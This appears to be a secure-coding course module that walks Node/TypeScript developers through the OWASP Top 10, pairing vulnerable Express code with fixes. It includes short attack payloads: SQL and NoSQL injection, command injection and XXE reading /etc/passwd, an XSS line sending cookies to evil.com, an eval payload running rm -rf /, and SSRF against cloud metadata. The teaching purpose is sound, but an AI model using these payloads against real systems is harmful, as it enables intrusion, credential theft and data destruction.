# ⚠️ Module 05: OWASP Top 10 (Developer Version)

**Difficulty:** 🟡 Intermediate  
**Time:** 120-180 minutes

---

## What You'll Learn

- The OWASP Top 10 web application vulnerabilities
- Root causes (why they happen)
- How to prevent them in TypeScript/Node
- Real-world code examples
- NOT just a checklist — understanding WHY

---

## About the OWASP Top 10

**OWASP** = Open Web Application Security Project

The **Top 10** is a ranking of the most critical web application security risks.

**This is NOT:**
- A comprehensive security guide
- A certification requirement  
- A compliance checklist

**This IS:**
- A starting point for thinking about common vulnerabilities
- Based on real-world data
- Updated periodically (currently 2021 version)

---

## 1. Injection (SQL, NoSQL, Command)

### What Is It?

**Injection occurs when untrusted data is sent to an interpreter as part of a command or query.**

---

### SQL Injection

#### Vulnerable Code

```typescript
// VULNERABLE
app.get('/users', async (req, res) => {
  const { search } = req.query;
  
  const query = `SELECT * FROM users WHERE username = '${search}'`;
  const users = await db.raw(query);
  
  res.json(users);
});
```

**Attack:**
```bash
curl "https://api.example.com/users?search=' OR '1'='1"
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

**Result:** Returns all users.

**Worse attack:**
```bash
curl "https://api.example.com/users?search='; DROP TABLE users; --"
```

---

#### Secure Code

**Use parameterized queries:**

```typescript
// SECURE (using ORM)
app.get('/users', async (req, res) => {
  const { search } = req.query;
  
  const users = await db.users.findAll({
    where: { username: search }
  });
  
  res.json(users);
});

// SECURE (using prepared statements)
app.get('/users', async (req, res) => {
  const { search } = req.query;
  
  const users = await db.query(
    'SELECT * FROM users WHERE username = $1',
    [search]
  );
  
  res.json(users);
});
```

**Why it works:** Parameters are escaped by the database driver, not concatenated into the query.

---

### NoSQL Injection (MongoDB)

#### Vulnerable Code

```typescript
// VULNERABLE
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  
  if (user) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Attack:**
```bash
curl -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

**Resulting query:**
```javascript
db.collection('users').findOne({
  username: { $ne: null },
  password: { $ne: null }
})
```

**Result:** Returns the first user (bypassing authentication).

---

#### Secure Code

```typescript
// SECURE: Validate input types
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Ensure strings (not objects)
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  const user = await db.collection('users').findOne({
    username: username,
    password: hashPassword(password)
  });
  
  if (user) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

---

### Command Injection

#### Vulnerable Code

```typescript
// VULNERABLE
app.post('/api/convert', (req, res) => {
  const { filename } = req.body;
  
  exec(`convert ${filename} ${filename}.pdf`, (err, stdout) => {
    if (err) return res.status(500).json({ error: 'Conversion failed' });
    res.json({ success: true });
  });
});
```

**Attack:**
```bash
curl -X POST https://api.example.com/convert \
  -d '{"filename": "file.jpg; cat /etc/passwd"}'
```

**Executed command:**
```bash
convert file.jpg; cat /etc/passwd file.jpg.pdf
```

---

#### Secure Code

```typescript
// SECURE: Avoid shell execution, validate input
import { execFile } from 'child_process';

app.post('/api/convert', (req, res) => {
  const { filename } = req.body;
  
  // Validate filename (alphanumeric, dots, dashes only)
  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  // Use execFile (doesn't invoke shell)
  execFile('convert', [filename, `${filename}.pdf`], (err, stdout) => {
    if (err) return res.status(500).json({ error: 'Conversion failed' });
    res.json({ success: true });
  });
});
```

---

## 2. Broken Authentication

### Common Issues

1. **Weak password requirements**
2. **No rate limiting** (brute force)
3. **Session fixation**
4. **Insecure password reset**
5. **Credential stuffing**

---

### Example: No Rate Limiting

```typescript
// VULNERABLE
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.users.findByUsername(username);
  if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  res.json({ token: generateToken(user) });
});

// Attacker can brute force passwords
```

---

### Mitigation: Rate Limiting

```typescript
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 attempts
  message: 'Too many login attempts, try again later',
  standardHeaders: true,
  legacyHeaders: false
});

app.post('/login', loginLimiter, async (req, res) => {
  // Login logic...
});
```

---

### Example: Weak Password Reset

```typescript
// VULNERABLE
app.post('/reset-password', async (req, res) => {
  const { email, securityAnswer } = req.body;
  
  const user = await db.users.findByEmail(email);
  if (user.securityAnswer === securityAnswer) {
    // Send reset link
  }
});

// Security questions are easily guessable
```

---

### Mitigation: Secure Password Reset

```typescript
app.post('/reset-password', async (req, res) => {
  const { email } = req.body;
  
  const user = await db.users.findByEmail(email);
  
  if (user) {
    // Generate cryptographically secure token
    const resetToken = crypto.randomBytes(32).toString('hex');
    const tokenHash = crypto.createHash('sha256').update(resetToken).digest('hex');
    
    // Store hashed token with expiration
    await db.passwordResets.create({
      userId: user.id,
      tokenHash,
      expiresAt: new Date(Date.now() + 3600000)  // 1 hour
    });
    
    // Send email with reset link
    await sendEmail(user.email, `https://app.com/reset?token=${resetToken}`);
  }
  
  // Always return success (prevent email enumeration)
  res.json({ success: true });
});
```

---

## 3. Sensitive Data Exposure

### Common Issues

1. **Plaintext passwords**
2. **Unencrypted data in transit** (no HTTPS)
3. **Sensitive data in logs**
4. **API responses leaking data**

---

### Example: Leaking Sensitive Data

```typescript
// VULNERABLE
app.get('/api/users/:id', async (req, res) => {
  const user = await db.users.findById(req.params.id);
  res.json(user);  // Returns everything (password hash, email, etc.)
});
```

---

### Mitigation: Use DTOs (Data Transfer Objects)

```typescript
// SECURE
app.get('/api/users/:id', async (req, res) => {
  const user = await db.users.findById(req.params.id);
  
  res.json({
    id: user.id,
    username: user.username,
    avatar: user.avatar
    // Exclude: passwordHash, email, phoneNumber, etc.
  });
});

// Or use a serializer function
function serializeUser(user) {
  return {
    id: user.id,
    username: user.username,
    avatar: user.avatar
  };
}

app.get('/api/users/:id', async (req, res) => {
  const user = await db.users.findById(req.params.id);
  res.json(serializeUser(user));
});
```

---

### Example: Logging Sensitive Data

```typescript
// BAD
app.post('/login', async (req, res) => {
  console.log('Login attempt:', req.body);  // Logs password!
  // ...
});

// GOOD
app.post('/login', async (req, res) => {
  console.log('Login attempt for user:', req.body.username);  // No password
  // ...
});
```

---

## 4. XML External Entities (XXE)

**Note:** Less common in Node.js (JSON is standard), but still relevant.

### Vulnerable Code

```typescript
import xml2js from 'xml2js';

app.post('/api/upload-xml', async (req, res) => {
  const parser = new xml2js.Parser();  // Default settings are vulnerable
  
  parser.parseString(req.body, (err, result) => {
    if (err) return res.status(400).json({ error: 'Invalid XML' });
    res.json(result);
  });
});
```

**Attack:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

---

### Mitigation

```typescript
const parser = new xml2js.Parser({
  xmldecl: {
    standalone: true
  },
  explicitRoot: false
});

// Better: Avoid XML if possible, use JSON
```

---

## 5. Broken Access Control (IDOR)

### Example: Insecure Direct Object Reference

```typescript
// VULNERABLE
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  res.json(order);  // No ownership check!
});

// User can access any order by changing :id
```

---

### Mitigation

```typescript
// SECURE
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.orders.findById(req.params.id);
  
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  if (order.userId !== req.user.id && !req.user.roles.includes('admin')) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.json(order);
});
```

---

### Mass Assignment Vulnerability

```typescript
// VULNERABLE
app.put('/api/users/:id', requireAuth, async (req, res) => {
  await db.users.update(req.params.id, req.body);
  res.json({ success: true });
});

// Attacker can send:
// { "isAdmin": true, "balance": 9999999 }
```

---

### Mitigation: Whitelist Fields

```typescript
// SECURE
app.put('/api/users/:id', requireAuth, async (req, res) => {
  const allowedFields = ['name', 'email', 'avatar'];
  
  const updates = {};
  for (const field of allowedFields) {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  }
  
  await db.users.update(req.params.id, updates);
  res.json({ success: true });
});
```

---

## 6. Security Misconfiguration

### Common Misconfigurations

1. **Default credentials**
2. **Directory listing enabled**
3. **Verbose error messages**
4. **Unnecessary services enabled**
5. **Missing security headers**

---

### Example: Verbose Error Messages

```typescript
// BAD
app.get('/api/users/:id', async (req, res) => {
  try {
    const user = await db.users.findById(req.params.id);
    res.json(user);
  } catch (err) {
    res.status(500).json({ error: err.message, stack: err.stack });
    // Leaks internal details!
  }
});

// GOOD
app.get('/api/users/:id', async (req, res) => {
  try {
    const user = await db.users.findById(req.params.id);
    res.json(user);
  } catch (err) {
    console.error('Error fetching user:', err);  // Log internally
    res.status(500).json({ error: 'Internal server error' });
  }
});
```

---

## 7. Cross-Site Scripting (XSS)

### Types of XSS

1. **Stored XSS** — Malicious script stored in database
2. **Reflected XSS** — Script in URL/request, reflected back
3. **DOM-based XSS** — Client-side JavaScript vulnerability

---

### Stored XSS

```typescript
// Backend (vulnerable)
app.post('/api/comments', async (req, res) => {
  const { text } = req.body;
  await db.comments.create({ text });  // No sanitization
  res.json({ success: true });
});

app.get('/api/comments', async (req, res) => {
  const comments = await db.comments.findAll();
  res.json(comments);
});
```

```html
<!-- Frontend (vulnerable) -->
<div id="comments"></div>

<script>
  fetch('/api/comments')
    .then(res => res.json())
    .then(comments => {
      comments.forEach(comment => {
        document.getElementById('comments').innerHTML += `<p>${comment.text}</p>`;
        // If comment.text contains <script>, it executes!
      });
    });
</script>
```

**Attack:**
```bash
curl -X POST https://api.example.com/comments \
  -d '{"text": "<script>fetch(\"https://evil.com/steal?cookie=\"+document.cookie)</script>"}'
```

---

### Mitigation: Output Encoding

```html
<!-- Use textContent instead of innerHTML -->
<div id="comments"></div>

<script>
  fetch('/api/comments')
    .then(res => res.json())
    .then(comments => {
      comments.forEach(comment => {
        const p = document.createElement('p');
        p.textContent = comment.text;  // Safe (not interpreted as HTML)
        document.getElementById('comments').appendChild(p);
      });
    });
</script>
```

**Or use a framework (React, Vue, etc.) that escapes by default:**

```jsx
// React (safe by default)
{comments.map(comment => (
  <p key={comment.id}>{comment.text}</p>
))}
```

---

### Reflected XSS

```typescript
// VULNERABLE
app.get('/search', (req, res) => {
  const { q } = req.query;
  res.send(`<h1>Search results for: ${q}</h1>`);
});
```

**Attack:**
```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

---

### Mitigation

```typescript
// SECURE
import escape from 'escape-html';

app.get('/search', (req, res) => {
  const { q } = req.query;
  res.send(`<h1>Search results for: ${escape(q)}</h1>`);
});
```

---

### Defense: Content-Security-Policy

```typescript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  next();
});
```

**This prevents inline `<script>` tags from executing.**

---

## 8. Insecure Deserialization

### Example

```typescript
// VULNERABLE
app.post('/api/data', (req, res) => {
  const obj = eval(`(${req.body.data})`);  // NEVER DO THIS
  // Process obj...
});
```

**Attack:**
```bash
curl -X POST https://api.example.com/data \
  -d '{"data": "({constructor: function(){ require(\"child_process\").exec(\"rm -rf /\") }()})"}'
```

---

### Mitigation

```typescript
// SECURE
app.post('/api/data', (req, res) => {
  try {
    const obj = JSON.parse(req.body.data);  // Safe
    // Process obj...
  } catch (err) {
    return res.status(400).json({ error: 'Invalid JSON' });
  }
});
```

**Rule: Never use `eval()`, `Function()`, or `vm.runInNewContext()` with user input.**

---

## 9. Using Components with Known Vulnerabilities

### The Problem

```json
{
  "dependencies": {
    "express": "4.16.0",  // Has known CVEs
    "lodash": "4.17.11"   // Known prototype pollution
  }
}
```

---

### Mitigation

#### 1. Audit Dependencies

```bash
npm audit

# Fix automatically (if possible)
npm audit fix
```

#### 2. Use Dependabot/Renovate

Automate dependency updates.

#### 3. Pin Versions (with lock files)

```bash
# Generates package-lock.json
npm install

# Commit package-lock.json to git
```

#### 4. Monitor CVE Databases

- [Snyk](https://snyk.io/)
- [GitHub Security Advisories](https://github.com/advisories)

---

## 10. Insufficient Logging & Monitoring

### What to Log

✅ Authentication attempts (successes and failures)  
✅ Authorization failures  
✅ Input validation failures  
✅ Server-side exceptions  
✅ Administrative actions  

❌ Passwords  
❌ Session tokens  
❌ Credit card numbers  
❌ PII (unless necessary)

---

### Example

```typescript
import winston from 'winston';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.users.findByUsername(username);
  if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
    logger.warn('Failed login attempt', {
      username,
      ip: req.ip,
      timestamp: new Date()
    });
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  logger.info('Successful login', {
    userId: user.id,
    ip: req.ip,
    timestamp: new Date()
  });
  
  res.json({ token: generateToken(user) });
});
```

---

## 11. Server-Side Request Forgery (SSRF)

**Note:** SSRF isn't in the traditional OWASP Top 10, but it's critical for modern web apps.

### Example

```typescript
// VULNERABLE
app.post('/api/fetch', async (req, res) => {
  const { url } = req.body;
  
  const response = await fetch(url);  // Attacker-controlled!
  const data = await response.text();
  
  res.send(data);
});
```

**Attack:**
```bash
# Access EC2 metadata
curl -X POST https://api.example.com/fetch \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Or access internal services
curl -X POST https://api.example.com/fetch \
  -d '{"url": "http://localhost:8080/admin"}'
```

---

### Mitigation

```typescript
import { URL } from 'url';

const allowedDomains = ['api.trusted.com', 'cdn.example.com'];

app.post('/api/fetch', async (req, res) => {
  const { url } = req.body;
  
  let parsed;
  try {
    parsed = new URL(url);
  } catch (err) {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  // Block private IPs
  if (parsed.hostname === 'localhost' || 
      parsed.hostname === '127.0.0.1' ||
      parsed.hostname.startsWith('192.168.') ||
      parsed.hostname.startsWith('10.') ||
      parsed.hostname === '169.254.169.254') {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  // Whitelist domains
  if (!allowedDomains.includes(parsed.hostname)) {
    return res.status(400).json({ error: 'Domain not allowed' });
  }
  
  const response = await fetch(url);
  const data = await response.text();
  
  res.send(data);
});
```

---

## Summary Table

| Vulnerability | Root Cause | Mitigation |
|---------------|------------|------------|
| **Injection** | Untrusted data in commands | Parameterized queries, input validation |
| **Broken Auth** | Weak auth logic | Strong passwords, MFA, rate limiting |
| **Data Exposure** | Leaking sensitive data | Encrypt data, use DTOs, HTTPS |
| **XXE** | XML parsing | Disable external entities, use JSON |
| **Access Control** | Missing authz checks | Check ownership, whitelist fields |
| **Misconfiguration** | Default/insecure settings | Harden configs, remove defaults |
| **XSS** | Unescaped user input | Output encoding, CSP |
| **Deserialization** | Insecure deserialization | Use JSON.parse, avoid eval |
| **Vulnerable Deps** | Outdated libraries | npm audit, Dependabot |
| **Logging** | Insufficient monitoring | Log security events |
| **SSRF** | Unvalidated URLs | Whitelist domains, block private IPs |

---

## Exercises

### Exercise 1: Find the Vulnerabilities
Review this code and identify all vulnerabilities:

```typescript
app.post('/api/search', async (req, res) => {
  const { query } = req.body;
  
  const results = await db.query(`SELECT * FROM products WHERE name LIKE '%${query}%'`);
  
  res.send(`<h1>Results</h1><ul>${results.map(r => `<li>${r.name}</li>`).join('')}</ul>`);
});
```

### Exercise 2: Secure a Feature
Implement a file upload feature that is secure against:
- Path traversal
- Malicious file types
- Large files (DoS)
- Stored XSS (in filename)

### Exercise 3: Audit Dependencies
```bash
cd your-project
npm audit
# Review and fix vulnerabilities
```

---

## What's Next?

Now that you understand common web vulnerabilities, let's explore OS-level security.

→ **Next: [Module 06: Linux & OS-Level Security](../06-linux-os-security/01-os-security-fundamentals.md)**

---

## Further Reading

- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- *The Web Application Hacker's Handbook* (Stuttard & Pinto)
